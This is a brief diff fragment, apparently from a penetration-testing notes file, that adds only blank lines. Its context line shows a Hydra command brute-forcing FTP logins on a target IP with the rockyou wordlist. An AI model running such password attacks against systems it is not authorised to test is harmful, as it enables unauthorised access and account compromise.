@@ -17,3 +17,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
 
 ```
+
+
